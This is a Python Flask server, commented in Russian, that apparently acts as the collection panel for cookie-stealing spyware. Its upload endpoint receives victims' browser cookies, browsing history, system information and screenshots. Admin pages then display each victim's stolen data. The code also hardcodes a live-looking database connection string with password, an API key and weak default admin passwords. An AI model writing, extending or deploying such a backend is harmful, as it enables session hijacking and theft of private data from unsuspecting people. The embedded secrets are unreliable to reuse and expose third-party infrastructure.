import os
import json
import base64
from datetime import datetime, timedelta
from flask import Flask, request, render_template, abort, jsonify, Response
from flask_cors import CORS
from flask_httpauth import HTTPBasicAuth
import psycopg2
import psycopg2.extras
from io import BytesIO
from PIL import Image
import io

app = Flask(__name__)
CORS(app, resources={r"/api/*": {"origins": "*"}})
app.secret_key = os.getenv("SECRET_KEY", "c1e4b3a0d5f8c7e2b3a0d5f8c7e2b3a0d5f8c7e2b3a0d5f8c7e2b3a0d5f8c7e2")
auth = HTTPBasicAuth()

# Админ-аккаунты
ADMINS = {
    os.getenv("ADMIN_USER1", "angel0chek"): os.getenv("ADMIN_PASS1", "angel0chek"),
    os.getenv("ADMIN_USER2", "winter"): os.getenv("ADMIN_PASS2", "winter")
}

UPLOAD_API_KEY = os.getenv("UPLOAD_API_KEY", "d3b07384d113edec49eaa6238ad5ff00")
DATABASE_URL = os.getenv("DATABASE_URL", "postgresql://neondb_owner:npg_FK3RL4ZGAXin@ep-frosty-wildflower-af3ua5fw-pooler.c-2.us-west-2.aws.neon.tech/neondb?sslmode=require&channel_binding=require")

if not DATABASE_URL:
    raise RuntimeError("DATABASE_URL must be set in env")

# --- Basic auth ---
@auth.verify_password
def verify(username, password):
    if username in ADMINS and ADMINS[username] == password:
        return username
    return None

# --- Image compression ---
def compress_image(image_data, quality=60):
    try:
        img = Image.open(io.BytesIO(image_data))
        if img.mode != 'RGB':
            img = img.convert('RGB')
            
        output = io.BytesIO()
        img.save(output, format='JPEG', quality=quality, optimize=True)
        return output.getvalue()
    except Exception as e:
        print(f"Image compression failed: {e}")
        return image_data

# --- DB helpers ---
def get_conn():
    return psycopg2.connect(DATABASE_URL, cursor_factory=psycopg2.extras.RealDictCursor)

def init_db():
    conn = get_conn()
    cur = conn.cursor()
    cur.execute('''
        CREATE TABLE IF NOT EXISTS users (
            id SERIAL PRIMARY KEY,
            username TEXT,
            cookies JSONB,
            history JSONB,
            system_info JSONB,
            screenshot BYTEA,
            timestamp TIMESTAMP
        );
        
        CREATE INDEX IF NOT EXISTS idx_timestamp ON users(timestamp);
    ''')
    conn.commit()
    cur.close()
    conn.close()

def cleanup_old_data(days=3):
    conn = get_conn()
    cur = conn.cursor()
    try:
        cur.execute("DELETE FROM users WHERE timestamp < %s", 
                   (datetime.utcnow() - timedelta(days=days),))
        conn.commit()
        return cur.rowcount
    except Exception as e:
        conn.rollback()
        raise e
    finally:
        cur.close()
        conn.close()

init_db()

# --- Routes ---
@app.route('/')
@auth.login_required
def admin_panel():
    conn = get_conn()
    cur = conn.cursor()
    cur.execute("SELECT id, username, timestamp FROM users ORDER BY id DESC LIMIT 200")
    rows = cur.fetchall()
    cur.close()
    conn.close()
    users = [{
        "id": r["id"], 
        "username": r["username"], 
        "timestamp": r["timestamp"].strftime("%Y-%m-%d %H:%M:%S") if r["timestamp"] else ""
    } for r in rows]
    return render_template('admin.html', users=users)

@app.route('/user/<int:user_id>')
@auth.login_required
def view_user(user_id):
    conn = get_conn()
    cur = conn.cursor()
    cur.execute("SELECT id, username, timestamp, (screenshot IS NOT NULL) as has_screenshot FROM users WHERE id=%s", (user_id,))
    row = cur.fetchone()
    cur.close()
    conn.close()
    if not row:
        abort(404)
    user_meta = {
        "id": row["id"], 
        "username": row["username"], 
        "timestamp": (row["timestamp"].strftime("%Y-%m-%d %H:%M:%S") if row["timestamp"] else ""), 
        "has_screenshot": row["has_screenshot"]
    }
    return render_template('user_detail.html', user=user_meta)

@app.route('/api/data/<int:user_id>')
@auth.login_required
def api_user_data(user_id):
    conn = get_conn()
    cur = conn.cursor()
    cur.execute("SELECT cookies, history, system_info, timestamp FROM users WHERE id=%s", (user_id,))
    row = cur.fetchone()
    cur.close()
    conn.close()
    if not row:
        return jsonify({"error": "not found"}), 404
    return jsonify({
        "cookies": row["cookies"] or [],
        "history": row["history"] or [],
        "system_info": row["system_info"] or {},
        "timestamp": row["timestamp"].strftime("%Y-%m-%d %H:%M:%S") if row["timestamp"] else ""
    })

@app.route('/screenshot/<int:user_id>')
@auth.login_required
def screenshot(user_id):
    conn = get_conn()
    cur = conn.cursor()
    cur.execute("SELECT screenshot FROM users WHERE id=%s", (user_id,))
    row = cur.fetchone()
    cur.close()
    conn.close()
    if not row or not row["screenshot"]:
        abort(404)
    img_bytes = row["screenshot"]
    return Response(img_bytes, mimetype='image/jpeg')

@app.route('/api/upload', methods=['POST'])
def api_upload():
    key = request.headers.get("X-API-KEY")
    if not UPLOAD_API_KEY or key != UPLOAD_API_KEY:
        return jsonify({"error": "unauthorized"}), 401

    data = request.get_json(silent=True)
    if not data:
        return jsonify({"error": "invalid json"}), 400

    username = data.get("username", "unknown")
    cookies = data.get("cookies", [])
    history = data.get("history", [])
    system_info = data.get("systemInfo", {})
    screenshot_base64 = data.get("screenshot")

    screenshot_bytes = None
    if screenshot_base64:
        try:
            screenshot_bytes = base64.b64decode(screenshot_base64)
            # Применяем сжатие
            screenshot_bytes = compress_image(screenshot_bytes)
        except Exception as e:
            print(f"Error processing screenshot: {e}")

    timestamp = datetime.utcnow()

    conn = get_conn()
    cur = conn.cursor()
    try:
        cur.execute(
            "INSERT INTO users (username, cookies, history, system_info, screenshot, timestamp) VALUES (%s, %s, %s, %s, %s, %s) RETURNING id",
            (
                username, 
                psycopg2.extras.Json(cookies), 
                psycopg2.extras.Json(history), 
                psycopg2.extras.Json(system_info), 
                psycopg2.Binary(screenshot_bytes) if screenshot_bytes else None, 
                timestamp
            )
        )
        new_id = cur.fetchone()[0]
        conn.commit()
    except Exception as e:
        conn.rollback()
        return jsonify({"error": "db error", "detail": str(e)}), 500
    finally:
        cur.close()
        conn.close()

    return jsonify({"status": "ok", "id": new_id})

@app.route('/api/cleanup', methods=['POST'])
@auth.login_required
def api_cleanup():
    try:
        count = cleanup_old_data()
        return jsonify({"status": "success", "deleted": count})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
